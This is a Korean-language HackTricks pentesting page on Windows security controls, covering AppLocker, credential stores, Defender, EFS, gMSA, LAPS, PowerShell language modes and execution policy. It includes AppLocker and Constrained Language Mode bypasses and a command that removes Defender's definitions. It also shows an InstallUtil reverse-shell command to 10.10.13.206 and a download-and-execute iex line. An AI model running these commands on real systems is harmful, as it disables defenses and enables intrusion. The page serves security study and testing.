# Windows 보안 컨트롤

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 **가장 고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker 정책

응용 프로그램 화이트리스트는 시스템에 존재하고 실행되는 것이 허용된 승인된 소프트웨어 응용 프로그램 또는 실행 파일 목록입니다. 목표는 유해한 악성 코드와 조직의 특정 비즈니스 요구 사항과 일치하지 않는 비승인된 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **응용 프로그램 화이트리스트 솔루션**으로, 시스템 관리자에게 **사용자가 실행할 수 있는 응용 프로그램 및 파일을 제어**할 수 있습니다. 실행 파일, 스크립트, Windows 설치 파일, DLL, 패키지 앱 및 패키지 앱 설치 프로그램에 대해 **세밀한 제어**를 제공합니다.\
조직에서는 **cmd.exe 및 PowerShell.exe를 차단**하고 특정 디렉토리에 대한 쓰기 액세스를 차단하는 것이 일반적이지만, **이 모두 우회될 수 있습니다**.

### 확인

블랙리스트/화이트리스트에 있는 파일/확장자를 확인하세요:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로에는 AppLocker에서 적용된 구성 및 정책이 포함되어 있으며 시스템에 적용된 현재 규칙 세트를 검토할 수 있는 방법을 제공합니다:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### 우회

* AppLocker 정책 우회에 유용한 **쓰기 가능한 폴더**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부에서 실행을 허용하는 경우 **쓰기 가능한 폴더**를 사용하여 **이를 우회**할 수 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 일반적으로 **신뢰하는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 이진 파일은 AppLocker 우회에 유용할 수 있습니다.
* **잘못 작성된 규칙도 우회될 수 있습니다**
* 예를 들어, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**와 같은 경우, **`allowed`**라는 폴더를 어디에든 생성하면 허용됩니다.
* 조직은 종종 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단**하지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`나 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell 실행 파일 위치**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)를 잊어버립니다.
* **DLL 강제 적용은 거의 사용되지 않습니다**. 시스템에 가해질 추가 부하와 아무것도 망가지지 않도록 보장하기 위해 필요한 테스트 양 때문입니다. 따라서 **DLL을 백도어로 사용하면 AppLocker 우회에 도움이 됩니다**.
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 **모든 프로세스에서 Powershell 코드를 실행**하고 AppLocker를 우회할 수 있습니다. 자세한 정보는 여기를 확인하십시오: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## 자격 증명 저장

### 보안 계정 관리자 (SAM)

로컬 자격 증명은 이 파일에 있으며, 비밀번호는 해시 처리되어 있습니다.

### 로컬 보안 권한 (LSA) - LSASS

**자격 증명**(해시 처리된)은 이 서브시스템의 **메모리**에 **저장**됩니다.\
**LSA**는 로컬 **보안 정책**(암호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 관리 등을 합니다.\
LSA는 로컬 로그인을 위해 **제공된 자격 증명을 SAM 파일 내에서 확인**하고 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 **통신**할 것입니다.

**자격 증명**은 **LSASS 프로세스 내에 저장**됩니다: Kerberos 티켓, NT 및 LM 해시, 쉽게 해독 가능한 비밀번호.

### LSA 비밀

LSA는 디스크에 일부 자격 증명을 저장할 수 있습니다:

* Active Directory 컴퓨터 계정의 비밀번호 (접근할 수 없는 도메인 컨트롤러).
* Windows 서비스 계정의 비밀번호
* 예약된 작업의 비밀번호
* 기타 (IIS 애플리케이션의 비밀번호 등...)

### NTDS.dit

이것은 Active Directory의 데이터베이스입니다. 도메인 컨트롤러에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)는 Windows 10 및 Windows 11, 그리고 Windows Server 버전에서 사용할 수 있는 백신입니다. **`WinPEAS`**와 같은 일반적인 펜테스팅 도구를 **차단**합니다. 그러나 이러한 보호 기능을 **우회하는 방법**이 있습니다.

### 확인

**Defender**의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행할 수 있습니다 (**`RealTimeProtectionEnabled`**의 값 확인):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

열거하려면 다음을 실행할 수도 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템 (EFS)

EFS는 **대칭 키**인 **파일 암호화 키 (FEK)**로 암호화하여 파일을 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요할 때는 사용자의 디지턈 인증서의 해당 **개인 키**가 사용되어 $EFS 스트림에서 FEK를 복호화합니다. 더 많은 세부 정보는 [여기](https://en.wikipedia.org/wiki/Encrypting\_File\_System)에서 확인할 수 있습니다.

**사용자의 개입 없이 복호화 시나리오**는 다음과 같습니다:

* 파일 또는 폴더가 [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)와 같은 비-EFS 파일 시스템으로 이동되면 자동으로 복호화됩니다.
* SMB/CIFS 프로토콜을 통해 네트워크로 전송된 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방법을 사용하면 소유자가 암호화된 파일에 **투명하게 액세스**할 수 있습니다. 그러나 소유자의 암호를 단순히 변경하고 로그인하는 것만으로는 복호화가 허용되지 않습니다.

**주요 포인트**:

* EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
* 복호화에는 사용자의 개인 키가 FEK에 액세스하는 데 사용됩니다.
* 특정 조건에서 자동 복호화가 발생하며, 이는 FAT32로 복사하거나 네트워크 전송과 같은 경우입니다.
* 암호화된 파일은 소유자에게 추가 단계 없이 액세스할 수 있습니다.

### EFS 정보 확인

이 **서비스**를 **사용한 사용자**가 있는지 확인하려면 이 경로가 있는지 확인하십시오:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>`를 사용하여 파일에 **액세스** 권한이 있는 **사용자**를 확인할 수 있습니다. 또한 폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화** 및 **복호화**할 수 있습니다.

### EFS 파일 복호화

#### 권한 시스템인 경우

이 방법은 **피해 사용자**가 호스트 내에서 **프로세스**를 **실행** 중이어야 합니다. 그런 경우에는 `meterpreter` 세션을 사용하여 사용자의 프로세스의 토큰을 흉내 낼 수 있습니다 (`incognito`의 `impersonate_token` 사용). 또는 사용자의 프로세스로 `이주`할 수도 있습니다.

#### 사용자 암호를 알고 있는 경우

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## 그룹 관리 서비스 계정 (gMSA)

마이크로소프트는 IT 인프라에서 서비스 계정을 관리하기 위해 **그룹 관리 서비스 계정 (gMSA)**을 개발했습니다. 종래의 서비스 계정이 종종 "**암호 만료 없음**" 설정이 활성화된 반면, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다:

* **자동 암호 관리**: gMSA는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경되는 복잡한 240자 암호를 사용합니다. 이 프로세스는 마이크로소프트의 키 분배 서비스 (KDC)에 의해 처리되어 수동 암호 업데이트가 필요하지 않습니다.
* **향상된 보안**: 이러한 계정은 잠금을 방지하고 대화형 로그인에 사용할 수 없으므로 보안이 강화됩니다.
* **다중 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있어 여러 서버에서 실행되는 서비스에 이상적입니다.
* **예약된 작업 기능**: 관리 서비스 계정과 달리 gMSA는 예약된 작업을 실행하는 것을 지원합니다.
* **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 세부 정보나 DNS 이름에 변경이 있을 때 시스템이 자동으로 서비스 주체 이름 (SPN)을 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 암호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 도메인 컨트롤러 (DC)에 의해 매월 30일마다 자동으로 재설정됩니다. 이 암호는 [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 데이터 덩어리로, 인가된 관리자 및 gMSA가 설치된 서버만이 검색할 수 있어 안전한 환경을 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.
```
/GMSAPasswordReader --AccountName jkohler
```
[**이 게시물에서 자세한 정보 확인**](https://cube0x0.github.io/Relaying-for-gMSA/)

또한, **NTLM 릴레이 공격**을 수행하여 **gMSA**의 **암호**를 **읽는 방법**에 대한 [웹 페이지](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하십시오.

## LAPS

**로컬 관리자 비밀번호 솔루션 (LAPS)**은 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있으며 로컬 관리자 비밀번호를 관리합니다. 이러한 비밀번호는 **랜덤**, 고유하며 **정기적으로 변경**되며 Active Directory에 중앙 집중식으로 저장됩니다. 이러한 비밀번호에 대한 액세스는 ACL을 통해 인가된 사용자에게 제한됩니다. 충분한 권한이 부여되면 로컬 관리자 비밀번호를 읽을 수 있습니다.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**제한된 언어 모드**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하기 위해 필요한 많은 기능을 **잠그는**데 사용됩니다. 이는 COM 객체 차단, 승인된 .NET 유형만 허용, XAML 기반 워크플로, PowerShell 클래스 등을 허용합니다.

### **확인**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회
```powershell
#Easy bypass
Powershell -version 2
```
현재 Windows에서 Bypass가 작동하지 않지만[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)를 사용할 수 있습니다.\
**컴파일하려면** **다음이 필요할 수 있습니다** _**참조 추가**_ -> _찾아보기_ ->_찾아보기_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 추가 및 **프로젝트를 .Net4.5로 변경**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 역쉘:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
다음은 인증 자격 증명, UAC 및 EFS에 대한 윈도우 강화 내용입니다. 

## PS 실행 정책

기본적으로 **제한됨(restricted)**으로 설정되어 있습니다. 이 정책을 우회하는 주요 방법:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
더 많은 정보는 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)에서 찾을 수 있습니다.

## 보안 지원 공급자 인터페이스 (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 통신을 원하는 두 대의 기기에 적합한 프로토콜을 찾는 역할을 합니다. 이를 위한 선호되는 방법은 Kerberos입니다. 그런 다음 SSPI는 사용할 인증 프로토콜을 협상하게 되는데, 이러한 인증 프로토콜은 보안 지원 공급자(SSP)라고 불리며 각 Windows 기기에 DLL 형태로 위치하고 있으며 통신을 위해 두 기기가 동일한 것을 지원해야 합니다.

### 주요 SSP

* **Kerberos**: 선호되는 방법
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** 및 **NTLMv2**: 호환성을 위해
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: 웹 서버 및 LDAP, MD5 해시 형식의 비밀번호
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL 및 TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됨 (Kerberos 또는 NTLM 중 Kerberos가 기본)
* %windir%\Windows\System32\lsasrv.dll

#### 협상은 여러 방법을 제안할 수도 있고 하나만 제안할 수도 있습니다.

## UAC - 사용자 계정 컨트롤

[사용자 계정 컨트롤 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 활동에 대한 동의 프롬프트**를 활성화하는 기능입니다.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 고급 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>제로부터 영월까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
